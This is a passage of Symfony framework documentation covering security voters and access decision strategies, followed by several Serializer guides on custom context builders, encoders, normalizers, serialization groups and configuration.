        protected function voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token): bool
        {
            $user = $token->getUser();

            if (!$user instanceof User) {
                // the user must be logged in; if not, deny access
                return false;
            }

            // you know $subject is a Post object, thanks to `supports()`
            /** @var Post $post */
            $post = $subject;

            return match($attribute) {
                self::VIEW => $this->canView($post, $user),
                self::EDIT => $this->canEdit($post, $user),
                default => throw new \LogicException('This code should not be reached!')
            };
        }

        private function canView(Post $post, User $user): bool
        {
            // if they can edit, they can view
            if ($this->canEdit($post, $user)) {
                return true;
            }

            // the Post object could have, for example, a method `isPrivate()`
            return !$post->isPrivate();
        }

        private function canEdit(Post $post, User $user): bool
        {
            // this assumes that the Post object has a `getOwner()` method
            return $user === $post->getOwner();
        }
    }

That's it! The voter is done! Next, :ref:`configure it <declaring-the-voter-as-a-service>`.

To recap, here's what's expected from the two abstract methods:

``Voter::supports(string $attribute, mixed $subject)``
    When ``isGranted()`` (or ``denyAccessUnlessGranted()``) is called, the first
    argument is passed here as ``$attribute`` (e.g. ``ROLE_USER``, ``edit``) and
    the second argument (if any) is passed as ``$subject`` (e.g. ``null``, a ``Post``
    object). Your job is to determine if your voter should vote on the attribute/subject
    combination. If you return true, ``voteOnAttribute()`` will be called. Otherwise,
    your voter is done: some other voter should process this. In this example, you
    return ``true`` if the attribute is ``view`` or ``edit`` and if the object is
    a ``Post`` instance.

``voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token)``
    If you return ``true`` from ``supports()``, then this method is called. Your
    job is to return ``true`` to allow access and ``false`` to deny access.
    The ``$token`` can be used to find the current user object (if any). In this
    example, all of the complex business logic is included to determine access.

.. _declaring-the-voter-as-a-service:

Configuring the Voter
---------------------

To inject the voter into the security layer, you must declare it as a service
and tag it with ``security.voter``. But if you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
that's done automatically for you! When you
:ref:`call isGranted() with view/edit and pass a Post object <how-to-use-the-voter-in-a-controller>`,
your voter will be called and you can control access.

Checking for Roles inside a Voter
---------------------------------

What if you want to call ``isGranted()`` from *inside* your voter - e.g. you want
to see if the current user has ``ROLE_SUPER_ADMIN``. That's possible by injecting
the :class:`Symfony\\Bundle\\SecurityBundle\\Security`
into your voter. You can use this to, for example, *always* allow access to a user
with ``ROLE_SUPER_ADMIN``::

    // src/Security/PostVoter.php

    // ...
    use Symfony\Bundle\SecurityBundle\Security;

    class PostVoter extends Voter
    {
        // ...

        public function __construct(
            private Security $security,
        ) {
        }

        protected function voteOnAttribute($attribute, mixed $subject, TokenInterface $token): bool
        {
            // ...

            // ROLE_SUPER_ADMIN can do anything! The power!
            if ($this->security->isGranted('ROLE_SUPER_ADMIN')) {
                return true;
            }

            // ... all the normal voter logic
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
you're done! Symfony will automatically pass the ``security.helper``
service when instantiating your voter (thanks to autowiring).

.. _security-voters-change-strategy:

Changing the Access Decision Strategy
-------------------------------------

Normally, only one voter will vote at any given time (the rest will "abstain", which
means they return ``false`` from ``supports()``). But in theory, you could make multiple
voters vote for one action and object. For instance, suppose you have one voter that
checks if the user is a member of the site and a second one that checks if the user
is older than 18.

To handle these cases, the access decision manager uses a "strategy" which you can configure.
There are four strategies available:

``affirmative`` (default)
    This grants access as soon as there is *one* voter granting access;

``consensus``
    This grants access if there are more voters granting access than
    denying. In case of a tie the decision is based on the
    ``allow_if_equal_granted_denied`` config option (defaulting to ``true``);

``unanimous``
    This only grants access if there is no voter denying access.

``priority``
    This grants or denies access by the first voter that does not abstain,
    based on their service priority;

Regardless the chosen strategy, if all voters abstained from voting, the
decision is based on the ``allow_if_all_abstain`` config option (which
defaults to ``false``).

In the above scenario, both voters should grant access in order to grant access
to the user to read the post. In this case, the default strategy is no longer
valid and ``unanimous`` should be used instead. You can set this in the
security configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            access_decision_manager:
                strategy: unanimous
                allow_if_all_abstain: false

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd"
        >

            <config>
                <access-decision-manager strategy="unanimous" allow-if-all-abstain="false"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->accessDecisionManager()
                ->strategy('unanimous')
                ->allowIfAllAbstain(false)
            ;
        };

Custom Access Decision Strategy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If none of the built-in strategies fits your use case, define the ``strategy_service``
option to use a custom service (your service must implement the
:class:`Symfony\\Component\\Security\\Core\Authorization\\Strategy\\AccessDecisionStrategyInterface`):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            access_decision_manager:
                strategy_service: App\Security\MyCustomAccessDecisionStrategy
                # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >

            <config>
                <access-decision-manager
                    strategy-service="App\Security\MyCustomAccessDecisionStrategy"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\MyCustomAccessDecisionStrategy;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->accessDecisionManager()
                ->strategyService(MyCustomAccessDecisionStrategy::class)
                // ...
            ;
        };

Custom Access Decision Manager
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to provide an entirely custom access decision manager, define the ``service``
option to use a custom service as the Access Decision Manager (your service
must implement the :class:`Symfony\\Component\\Security\\Core\\Authorization\\AccessDecisionManagerInterface`):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            access_decision_manager:
                service: App\Security\MyCustomAccessDecisionManager
                # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >

            <config>
                <access-decision-manager
                    service="App\Security\MyCustomAccessDecisionManager"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\MyCustomAccessDecisionManager;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->accessDecisionManager()
                ->service(MyCustomAccessDecisionManager::class)
                // ...
            ;
        };

.. _security-voters-change-message-and-status-code:

Changing the message and status code returned
---------------------------------------------

By default, the ``#[IsGranted]`` attribute will throw a
:class:`Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException`
and return an http **403** status code with **Access Denied** as message.

However, you can change this behavior by specifying the message and status code returned::

    // src/Controller/PostController.php

    // ...
    use Symfony\Component\Security\Http\Attribute\IsGranted;

    class PostController extends AbstractController
    {
        #[Route('/posts/{id}', name: 'post_show')]
        #[IsGranted('show', 'post', 'Post not found', 404)]
        public function show(Post $post): Response
        {
            // ...
        }
    }

.. tip::

    If the status code is different than 403, an
    :class:`Symfony\\Component\\HttpKernel\\Exception\\HttpException`
    will be thrown instead.
How to Create your Custom Context Builder
=========================================

The :doc:`Serializer Component </components/serializer>` uses Normalizers
and Encoders to transform any data to any data-structure (e.g. JSON).
That serialization process can be configured thanks to a
:ref:`serialization context <serializer_serializer-context>`, which can be built thanks to
:ref:`context builders <component-serializer-context-builders>`.

Each built-in normalizer/encoder has its related context builder. However, you
may want to create a custom context builder for your
:doc:`custom normalizers </serializer/custom_normalizer>`.

Creating a new Context Builder
------------------------------

Let's imagine that you want to handle date denormalization differently if they
are coming from a legacy system, by converting dates to ``null`` if the serialized
value is ``0000-00-00``. To do that you'll first have to create your normalizer::

    // src/Serializer/ZeroDateTimeDenormalizer.php
    namespace App\Serializer;

    use Symfony\Component\Serializer\Normalizer\DenormalizerAwareInterface;
    use Symfony\Component\Serializer\Normalizer\DenormalizerAwareTrait;
    use Symfony\Component\Serializer\Normalizer\DenormalizerInterface;

    final class ZeroDateTimeDenormalizer implements DenormalizerInterface, DenormalizerAwareInterface
    {
        use DenormalizerAwareTrait;

        public function denormalize($data, string $type, ?string $format = null, array $context = []): mixed
        {
            if ('0000-00-00' === $data) {
                return null;
            }

            unset($context['zero_datetime_to_null']);

            return $this->denormalizer->denormalize($data, $type, $format, $context);
        }

        public function supportsDenormalization($data, string $type, ?string $format = null, array $context = []): bool
        {
            return true === ($context['zero_datetime_to_null'] ?? false)
                && is_a($type, \DateTimeInterface::class, true);
        }
    }

Now you can cast zero-ish dates to ``null`` during denormalization::

    $legacyData = '{"updatedAt": "0000-00-00"}';
    $serializer->deserialize($legacyData, MyModel::class, 'json', ['zero_datetime_to_null' => true]);

Now, to avoid having to remember about this specific ``zero_date_to_null``
context key, you can create a dedicated context builder::

    // src/Serializer/LegacyContextBuilder
    namespace App\Serializer;

    use Symfony\Component\Serializer\Context\ContextBuilderInterface;
    use Symfony\Component\Serializer\Context\ContextBuilderTrait;

    final class LegacyContextBuilder implements ContextBuilderInterface
    {
        use ContextBuilderTrait;

        public function withLegacyDates(bool $legacy): static
        {
            return $this->with('zero_datetime_to_null', $legacy);
        }
    }

And finally, use it to build the serialization context::

    $legacyData = '{"updatedAt": "0000-00-00"}';

    $context = (new LegacyContextBuilder())
        ->withLegacyDates(true)
        ->toArray();

    $serializer->deserialize($legacyData, MyModel::class, 'json', $context);
How to Create your Custom Encoder
=================================

The :doc:`Serializer Component </components/serializer>` uses Normalizers
to transform any data to an array. Then, by leveraging *Encoders*, that data can
be converted into any data-structure (e.g. JSON).

The Component provides several built-in encoders that are described
:doc:`in the serializer component </components/serializer>` but you may want
to use another structure that's not supported.

Creating a new encoder
----------------------

Imagine you want to serialize and deserialize YAML. For that you'll have to
create your own encoder that uses the
:doc:`Yaml Component </components/yaml>`::

    // src/Serializer/YamlEncoder.php
    namespace App\Serializer;

    use Symfony\Component\Serializer\Encoder\DecoderInterface;
    use Symfony\Component\Serializer\Encoder\EncoderInterface;
    use Symfony\Component\Yaml\Yaml;

    class YamlEncoder implements EncoderInterface, DecoderInterface
    {
        public function encode($data, string $format, array $context = []): string
        {
            return Yaml::dump($data);
        }

        public function supportsEncoding(string $format, array $context = []): bool
        {
            return 'yaml' === $format;
        }

        public function decode(string $data, string $format, array $context = []): array
        {
            return Yaml::parse($data);
        }

        public function supportsDecoding(string $format, array $context = []): bool
        {
            return 'yaml' === $format;
        }
    }

Registering it in your app
--------------------------

If you use the Symfony Framework, then you probably want to register this encoder
as a service in your app. If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
that's done automatically!

.. tip::

    If you're not using :ref:`autoconfigure <services-autoconfigure>`, make sure
    to register your class as a service and tag it with ``serializer.encoder``.

Now you'll be able to serialize and deserialize YAML!
How to Create your Custom Normalizer
====================================

The :doc:`Serializer component </components/serializer>` uses
normalizers to transform any data into an array. The component provides several
:ref:`built-in normalizers <component-serializer-normalizers>` but you may need to create
your own normalizer to transform an unsupported data structure.

Creating a New Normalizer
-------------------------

Imagine you want add, modify, or remove some properties during the serialization
process. For that you'll have to create your own normalizer. But it's usually
preferable to let Symfony normalize the object, then hook into the normalization
to customize the normalized data. To do that, you can inject a
``NormalizerInterface`` and wire it to Symfony's object normalizer. This will give
you access to a ``$normalizer`` property which takes care of most of the
normalization process::

    // src/Serializer/TopicNormalizer.php
    namespace App\Serializer;

    use App\Entity\Topic;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;
    use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
    use Symfony\Component\Serializer\Normalizer\NormalizerInterface;

    class TopicNormalizer implements NormalizerInterface
    {
        public function __construct(
            #[Autowire(service: 'serializer.normalizer.object')]
            private readonly NormalizerInterface $normalizer,

            private UrlGeneratorInterface $router,
        ) {
        }

        public function normalize($topic, ?string $format = null, array $context = []): array
        {
            $data = $this->normalizer->normalize($topic, $format, $context);

            // Here, add, edit, or delete some data:
            $data['href']['self'] = $this->router->generate('topic_show', [
                'id' => $topic->getId(),
            ], UrlGeneratorInterface::ABSOLUTE_URL);

            return $data;
        }

        public function supportsNormalization($data, ?string $format = null, array $context = []): bool
        {
            return $data instanceof Topic;
        }

        public function getSupportedTypes(?string $format): array
        {
            return [
                Topic::class => true,
            ];
        }
    }

Registering it in your Application
----------------------------------

Before using this normalizer in a Symfony application it must be registered as
a service and :doc:`tagged </service_container/tags>` with ``serializer.normalizer``.
If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
this is done automatically!

Performance of Normalizers/Denormalizers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To figure which normalizer (or denormalizer) must be used to handle an object,
the :class:`Symfony\\Component\\Serializer\\Serializer` class will call the
:method:`Symfony\\Component\\Serializer\\Normalizer\\NormalizerInterface::supportsNormalization`
(or :method:`Symfony\\Component\\Serializer\\Normalizer\\DenormalizerInterface::supportsDenormalization`)
of all registered normalizers (or denormalizers) in a loop.

Additionally, both
:class:`Symfony\\Component\\Serializer\\Normalizer\\NormalizerInterface`
and :class:`Symfony\\Component\\Serializer\\Normalizer\\DenormalizerInterface`
contain the ``getSupportedTypes()`` method. This method allows normalizers or
denormalizers to declare the type of objects they can handle, and whether they
are cacheable. With this info, even if the ``supports*()`` call is not cacheable,
the Serializer can skip a ton of method calls to ``supports*()`` improving
performance substantially in some cases.

The ``getSupportedTypes()`` method should return an array where the keys
represent the supported types, and the values indicate whether the result of
the ``supports*()`` method call can be cached or not. The format of the
returned array is as follows:

#. The special key ``object`` can be used to indicate that the normalizer or
   denormalizer supports any classes or interfaces.
#. The special key ``*`` can be used to indicate that the normalizer or
   denormalizer might support any types.
#. The other keys in the array should correspond to specific types that the
   normalizer or denormalizer supports.
#. The values associated with each type should be a boolean indicating if the
   result of the ``supports*()`` method call for that type can be cached or not.
   A value of ``true`` means that the result is cacheable, while ``false`` means
   that the result is not cacheable.
#. A ``null`` value for a type means that the normalizer or denormalizer does
   not support that type.

Here is an example of how to use the ``getSupportedTypes()`` method::

    use Symfony\Component\Serializer\Normalizer\NormalizerInterface;

    class MyNormalizer implements NormalizerInterface
    {
        // ...

        public function getSupportedTypes(?string $format): array
        {
            return [
                'object' => null,             // Doesn't support any classes or interfaces
                '*' => false,                 // Supports any other types, but the result is not cacheable
                MyCustomClass::class => true, // Supports MyCustomClass and result is cacheable
            ];
        }
    }

.. note::

    The ``supports*()`` method implementations should not assume that
    ``getSupportedTypes()`` has been called before.
How to Use the Serializer
=========================

Symfony provides a serializer to serialize/deserialize to and from objects and
different formats (e.g. JSON or XML). Before using it, read the
:doc:`Serializer component docs </components/serializer>` to get familiar with
its philosophy and the normalizers and encoders terminology.

.. _activating_the_serializer:

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the ``serializer`` :ref:`Symfony pack <symfony-packs>` before using it:

.. code-block:: terminal

    $ composer require symfony/serializer-pack

Using the Serializer Service
----------------------------

Once enabled, the serializer service can be injected in any service where
you need it or it can be used in a controller::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Serializer\SerializerInterface;

    class DefaultController extends AbstractController
    {
        public function index(SerializerInterface $serializer): Response
        {
            // keep reading for usage examples
        }
    }

Or you can use the ``serialize`` Twig filter in a template:

.. code-block:: twig

    {{ object|serialize(format = 'json') }}

See the :doc:`twig reference </reference/twig_reference>` for
more information.

Adding Normalizers and Encoders
-------------------------------

Once enabled, the ``serializer`` service will be available in the container.
It comes with a set of useful :ref:`encoders <component-serializer-encoders>`
and :ref:`normalizers <component-serializer-normalizers>`.

Encoders supporting the following formats are enabled:

* JSON: :class:`Symfony\\Component\\Serializer\\Encoder\\JsonEncoder`
* XML: :class:`Symfony\\Component\\Serializer\\Encoder\\XmlEncoder`
* CSV: :class:`Symfony\\Component\\Serializer\\Encoder\\CsvEncoder`
* YAML: :class:`Symfony\\Component\\Serializer\\Encoder\\YamlEncoder`

As well as the following normalizers:

* :class:`Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\DateTimeZoneNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\DateIntervalNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\FormErrorNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\DataUriNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\JsonSerializableNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\ArrayDenormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\ConstraintViolationListNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\ProblemNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\BackedEnumNormalizer`
* :class:`Symfony\\Component\\Serializer\\Normalizer\\TranslatableNormalizer`

Other :ref:`built-in normalizers <component-serializer-normalizers>` and
custom normalizers and/or encoders can also be loaded by tagging them as
:ref:`serializer.normalizer <reference-dic-tags-serializer-normalizer>` and
:ref:`serializer.encoder <reference-dic-tags-serializer-encoder>`. It's also
possible to set the priority of the tag in order to decide the matching order.

.. danger::

    Always make sure to load the ``DateTimeNormalizer`` when serializing the
    ``DateTime`` or ``DateTimeImmutable`` classes to avoid excessive memory
    usage and exposing internal details.

.. _serializer_serializer-context:

Serializer Context
------------------

The serializer can define a context to control the (de)serialization of
resources. This context is passed to all normalizers. For example:

* :class:`Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer` uses
  ``datetime_format`` key as date time format;
* :class:`Symfony\\Component\\Serializer\\Normalizer\\AbstractObjectNormalizer`
  uses ``preserve_empty_objects`` to represent empty objects as ``{}`` instead
  of ``[]`` in JSON.
* :class:`Symfony\\Component\\Serializer\\Serializer`
  uses ``empty_array_as_object`` to represent empty arrays as ``{}`` instead
  of ``[]`` in JSON.

You can pass the context as follows::

    $serializer->serialize($something, 'json', [
        DateTimeNormalizer::FORMAT_KEY => 'Y-m-d H:i:s',
    ]);

    $serializer->deserialize($someJson, Something::class, 'json', [
        DateTimeNormalizer::FORMAT_KEY => 'Y-m-d H:i:s',
    ]);

You can also configure the default context through the framework
configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            serializer:
                default_context:
                    enable_max_depth: true
                    yaml_indentation: 2

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <framework:config>
            <!-- ... -->
            <framework:serializer>
                <default-context enable-max-depth="true" yaml-indentation="2"/>
            </framework:serializer>
        </framework:config>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Component\Serializer\Encoder\YamlEncoder;
        use Symfony\Component\Serializer\Normalizer\AbstractObjectNormalizer;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->serializer()
                ->defaultContext([
                    AbstractObjectNormalizer::ENABLE_MAX_DEPTH => true,
                    YamlEncoder::YAML_INDENTATION => 2,
                ])
            ;
        };

You can also specify the context on a per-property basis::

.. configuration-block::

    .. code-block:: php-attributes

        namespace App\Model;

        use Symfony\Component\Serializer\Annotation\Context;
        use Symfony\Component\Serializer\Normalizer\DateTimeNormalizer;

        class Person
        {
            #[Context([DateTimeNormalizer::FORMAT_KEY => 'Y-m-d'])]
            public \DateTimeInterface $createdAt;

            // ...
        }

    .. code-block:: yaml

        App\Model\Person:
            attributes:
                createdAt:
                    contexts:
                        - { context: { datetime_format: 'Y-m-d' } }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="App\Model\Person">
                <attribute name="createdAt">
                    <context>
                        <entry name="datetime_format">Y-m-d</entry>
                    </context>
                </attribute>
            </class>
        </serializer>

Use the options to specify context specific to normalization or denormalization::

    namespace App\Model;

    use Symfony\Component\Serializer\Annotation\Context;
    use Symfony\Component\Serializer\Normalizer\DateTimeNormalizer;

    class Person
    {
        #[Context(
            normalizationContext: [DateTimeNormalizer::FORMAT_KEY => 'Y-m-d'],
            denormalizationContext: [DateTimeNormalizer::FORMAT_KEY => '!Y-m-d'], // To prevent to have the time from the moment of denormalization
        )]
        public \DateTimeInterface $createdAt;

        // ...
    }

You can also restrict the usage of a context to some groups::

    namespace App\Model;

    use Symfony\Component\Serializer\Annotation\Context;
    use Symfony\Component\Serializer\Annotation\Groups;
    use Symfony\Component\Serializer\Normalizer\DateTimeNormalizer;

    class Person
    {
        #[Groups(['extended'])]
        #[Context([DateTimeNormalizer::FORMAT_KEY => \DateTime::RFC3339])]
        #[Context(
            context: [DateTimeNormalizer::FORMAT_KEY => \DateTime::RFC3339_EXTENDED],
            groups: ['extended'],
        )]
        public \DateTimeInterface $createdAt;

        // ...
    }

The attribute can be repeated as much as needed on a single property.
Context without group is always applied first. Then context for the matching
groups are merged in the provided order.

If you repeat the same context in multiple properties, consider using the
``#[Context]`` attribute on your class to apply that context configuration to
all the properties of the class::

    namespace App\Model;

    use Symfony\Component\Serializer\Annotation\Context;
    use Symfony\Component\Serializer\Normalizer\DateTimeNormalizer;

    #[Context([DateTimeNormalizer::FORMAT_KEY => \DateTime::RFC3339])]
    #[Context(
        context: [DateTimeNormalizer::FORMAT_KEY => \DateTime::RFC3339_EXTENDED],
        groups: ['extended'],
    )]
    class Person
    {
        // ...
    }

.. _serializer-using-context-builders:

Using Context Builders
----------------------

To define the (de)serialization context, you can use "context builders", which
are objects that help you to create that context by providing autocompletion,
validation, and documentation::

    use Symfony\Component\Serializer\Context\Normalizer\DateTimeNormalizerContextBuilder;

    $contextBuilder = (new DateTimeNormalizerContextBuilder())->withFormat('Y-m-d H:i:s');
    $serializer->serialize($something, 'json', $contextBuilder->toArray());

Each normalizer/encoder has its related :ref:`context builder <component-serializer-context-builders>`.
To create a more complex (de)serialization context, you can chain them using the
``withContext()`` method::

    use Symfony\Component\Serializer\Context\Encoder\CsvEncoderContextBuilder;
    use Symfony\Component\Serializer\Context\Normalizer\ObjectNormalizerContextBuilder;

    $initialContext = [
        'custom_key' => 'custom_value',
    ];

    $contextBuilder = (new ObjectNormalizerContextBuilder())
        ->withContext($initialContext)
        ->withGroups(['group1', 'group2']);

    $contextBuilder = (new CsvEncoderContextBuilder())
        ->withContext($contextBuilder)
        ->withDelimiter(';');

    $serializer->serialize($something, 'csv', $contextBuilder->toArray());

You can also :doc:`create your context builders </serializer/custom_context_builders>`
to have autocompletion, validation, and documentation for your custom context values.

.. _serializer-using-serialization-groups-attributes:

Using Serialization Groups Attributes
-------------------------------------

You can add :ref:`#[Groups] attributes <component-serializer-attributes-groups-attributes>`
to your class properties::

    // src/Entity/Product.php
    namespace App\Entity;

    use Doctrine\ORM\Mapping as ORM;
    use Symfony\Component\Serializer\Annotation\Groups;

    #[ORM\Entity]
    class Product
    {
        #[ORM\Id]
        #[ORM\GeneratedValue]
        #[ORM\Column(type: 'integer')]
        #[Groups(['show_product', 'list_product'])]
        private int $id;

        #[ORM\Column(type: 'string', length: 255)]
        #[Groups(['show_product', 'list_product'])]
        private string $name;

        #[ORM\Column(type: 'text')]
        #[Groups(['show_product'])]
        private string $description;
    }

You can also use the ``#[Groups]`` attribute on class level::

    #[ORM\Entity]
    #[Groups(['show_product'])]
    class Product
    {
        #[ORM\Id]
        #[ORM\GeneratedValue]
        #[ORM\Column(type: 'integer')]
        #[Groups(['list_product'])]
        private int $id;

        #[ORM\Column(type: 'string', length: 255)]
        #[Groups(['list_product'])]
        private string $name;

        #[ORM\Column(type: 'text')]
        private string $description;
    }

In this example, the ``id`` and the ``name`` properties belong to the
``show_product`` and ``list_product`` groups. The ``description`` property
only belongs to the ``show_product`` group.

Now that your groups are defined, you can choose which groups to use when
serializing::

    use Symfony\Component\Serializer\Context\Normalizer\ObjectNormalizerContextBuilder;

    $context = (new ObjectNormalizerContextBuilder())
        ->withGroups('show_product')
        ->toArray();

    $json = $serializer->serialize($product, 'json', $context);

.. tip::

    The value of the ``groups`` key can be a single string, or an array of strings.

In addition to the ``#[Groups]`` attribute, the Serializer component also
supports YAML or XML files. These files are automatically loaded when being
stored in one of the following locations:

* All ``*.yaml`` and ``*.xml`` files in the ``config/serializer/``
  directory.
* The ``serialization.yaml`` or ``serialization.xml`` file in
  the ``Resources/config/`` directory of a bundle;
* All ``*.yaml`` and ``*.xml`` files in the ``Resources/config/serialization/``
  directory of a bundle.

.. note::

    The groups used by default when normalizing and denormalizing objects are
    ``Default`` and the group that matches the class name. For example, if you
    are normalizing a ``App\Entity\Product`` object, the groups used are
    ``Default`` and ``Product``.

    .. versionadded:: 7.1

        The default use of the class name and ``Default`` groups when normalizing
        and denormalizing objects was introduced in Symfony 7.1.

.. _serializer-enabling-metadata-cache:

Using Nested Attributes
-----------------------

To map nested properties, use the ``SerializedPath`` configuration to define
their paths using a :doc:`valid PropertyAccess syntax </components/property_access>`:

.. configuration-block::

    .. code-block:: php-attributes

        namespace App\Model;

        use Symfony\Component\Serializer\Annotation\SerializedPath;

        class Person
        {
            #[SerializedPath('[profile][information][birthday]')]
            private string $birthday;

            // ...
        }

    .. code-block:: yaml

        App\Model\Person:
            attributes:
                dob:
                    serialized_path: '[profile][information][birthday]'

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="App\Model\Person">
                <attribute name="dob" serialized-path="[profile][information][birthday]"/>
            </class>
        </serializer>

Using the configuration from above, denormalizing with a metadata-aware
normalizer will write the ``birthday`` field from ``$data`` onto the ``Person``
object::

    $data = [
        'profile' => [
            'information' => [
                'birthday' => '01-01-1970',
            ],
        ],
    ];
    $person = $normalizer->denormalize($data, Person::class, 'any');
    $person->getBirthday(); // 01-01-1970

When using attributes, the ``SerializedPath`` can either
be set on the property or the associated _getter_ method. The ``SerializedPath``
cannot be used in combination with a ``SerializedName`` for the same property.

Configuring the Metadata Cache
------------------------------

The metadata for the serializer is automatically cached to enhance application
performance. By default, the serializer uses the ``cache.system`` cache pool
which is configured using the :ref:`cache.system <reference-cache-system>`
option.

Enabling a Name Converter
-------------------------

The use of a :ref:`name converter <component-serializer-converting-property-names-when-serializing-and-deserializing>`
service can be defined in the configuration using the :ref:`name_converter <reference-serializer-name_converter>`
option.

The built-in :ref:`CamelCase to snake_case name converter <using-camelized-method-names-for-underscored-attributes>`
can be enabled by using the ``serializer.name_converter.camel_case_to_snake_case``
value:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            serializer:
                name_converter: 'serializer.name_converter.camel_case_to_snake_case'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <framework:config>
            <!-- ... -->
            <framework:serializer name-converter="serializer.name_converter.camel_case_to_snake_case"/>
        </framework:config>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->serializer()->nameConverter('serializer.name_converter.camel_case_to_snake_case');
        };

Debugging the Serializer
------------------------

Use the ``debug:serializer`` command to dump the serializer metadata of a
given class:

.. code-block:: terminal

    $ php bin/console debug:serializer 'App\Entity\Book'

        App\Entity\Book
        ---------------

        +----------+------------------------------------------------------------+
        | Property | Options                                                    |
        +----------+------------------------------------------------------------+
        | name     | [                                                          |
        |          |   "groups" => [                                            |
        |          |       "book:read",                                         |
        |          |       "book:write",                                        |
        |          |   ],                                                       |
        |          |   "maxDepth" => 1,                                         |
        |          |   "serializedName" => "book_name",                         |
        |          |   "serializedPath" => null,                                |
        |          |   "ignore" => false,                                       |
        |          |   "normalizationContexts" => [],                           |
        |          |   "denormalizationContexts" => []                          |
        |          | ]                                                          |
        | isbn     | [                                                          |
        |          |   "groups" => [                                            |
        |          |       "book:read",                                         |
        |          |   ],                                                       |
        |          |   "maxDepth" => null,                                      |
        |          |   "serializedName" => null,                                |
        |          |   "serializedPath" => [data][isbn],                        |
        |          |   "ignore" => false,                                       |
        |          |   "normalizationContexts" => [],                           |
        |          |   "denormalizationContexts" => []                          |
        |          | ]                                                          |
        +----------+------------------------------------------------------------+

Going Further with the Serializer
---------------------------------

`API Platform`_ provides an API system supporting the following formats:

* `JSON-LD`_ along with the `Hydra Core Vocabulary`_
* `OpenAPI`_ v2 (formerly Swagger) and v3
* `GraphQL`_
* `JSON:API`_
* `HAL`_
* JSON
* XML
* YAML
* CSV

